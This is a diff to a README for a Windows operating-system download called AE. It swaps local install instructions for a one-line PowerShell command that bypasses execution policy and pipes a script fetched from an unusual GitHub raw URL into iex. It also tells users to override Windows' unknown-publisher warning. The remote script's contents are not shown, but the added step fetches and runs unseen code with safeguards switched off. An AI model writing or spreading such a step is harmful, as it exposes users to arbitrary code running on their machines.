@@ -1,6 +1,25 @@
 # AE downloads
 
-Two builds of the same operating system. Pick one.
+### Install in one click
+
+**https://github.com/SPORstudio-Official/moddelingmym/raw/arena/1c294196-moddelingmym/dist/download.html**
+
+That page has the install button. The direct links, if you want them:
+
+| What | Link | What it does |
+| --- | --- | --- |
+| **Install** | [`install-ae.cmd`](install-ae.cmd) | downloads AE, verifies the SHA-256, installs to `%LOCALAPPDATA%\AE`, adds a Start-menu shortcut, starts it |
+| **Run directly** | [`AE.exe`](AE.exe) | no install at all — 821,760 bytes, double-click |
+| **In a browser** | [`AE.html`](AE.html) | the same OS as WebAssembly; macOS and Linux too |
+
+One line, no download step:
+
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/SPORstudio-Official/moddelingmym/raw/arena/1c294196-moddelingmym/dist/install-ae.ps1 | iex"
+```
+
+Windows will say the publisher is unknown because the binary is not code-signed.
+Choose **More info → Run anyway**.
 
 ---
 
@@ -23,19 +42,6 @@ on the machine renders it for us.
   store — there is no browser process behind it
 - Type words instead of an address in AE Browser and you get search results, from
   a free MCP server that needs no account (100 searches a day)
-
-On first launch Windows may show *"Windows protected your PC"* because the binary
-is not code-signed — choose **More info → Run anyway**.
-
-### One-click install (alternative to double-clicking)
-
-`install-ae.cmd` downloads the executable, verifies its checksum, places it in
-`%LOCALAPPDATA%\AE` and starts it. Or run the PowerShell script directly to get a
-Start Menu shortcut too:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File install-ae.ps1 -AddShortcut
-```
 
 ---
 
